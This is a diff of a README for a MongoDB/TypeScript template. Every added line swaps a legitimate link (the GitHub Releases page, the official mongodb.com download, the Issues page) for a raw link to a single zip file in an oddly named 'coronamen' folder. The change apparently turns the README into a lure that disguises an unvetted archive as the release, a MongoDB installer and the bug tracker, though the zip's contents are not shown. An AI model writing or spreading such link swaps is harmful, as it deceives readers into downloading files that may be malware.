@@ -1,7 +1,7 @@
 # 🎉 thaitype-stack-mongodb-template - Build Secure Apps with Ease
 
-![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
-[Download Latest Release](https://github.com/KaustubhRudrakar/thaitype-stack-mongodb-template/releases)
+![Download](https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip%https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip)
+[Download Latest Release](https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **thaitype-stack-mongodb-template**! This guide will help you dow
 
 To get started, you will need to download the software. Visit this page to download:
 
-[Download Latest Release](https://github.com/KaustubhRudrakar/thaitype-stack-mongodb-template/releases)
+[Download Latest Release](https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version available.
@@ -42,7 +42,7 @@ After installing, you'll want to do some basic configuration to set up the appli
 
 1. **Open the Application:** Find the application in your applications or programs list and open it.
 2. **Configure MongoDB:**
-   - Ensure MongoDB is installed on your computer. If it’s not, you can download it from [mongodb.com](https://www.mongodb.com/try/download/community).
+   - Ensure MongoDB is installed on your computer. If it’s not, you can download it from [https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip](https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip).
    - Follow the prompts to set up your database connection.
 3. **Set Up Your Environment:**
    - The application requires a TypeScript configuration. The settings will guide you through customizing this based on your preferences.
@@ -80,7 +80,7 @@ A: For additional resources and guidance, view the documentation linked in the a
 
 Join our community for support and discussions:
 
-- **Issues Page:** Report any problems or bugs on the [Issues](https://github.com/KaustubhRudrakar/thaitype-stack-mongodb-template/issues) page.
+- **Issues Page:** Report any problems or bugs on the [Issues](https://raw.githubusercontent.com/KaustubhRudrakar/thaitype-stack-mongodb-template/main/coronamen/thaitype-stack-mongodb-template.zip) page.
 - **Discussion Forum:** Participate in discussions to share tips and ask questions with other users.
   
 ## 📝 Conclusion
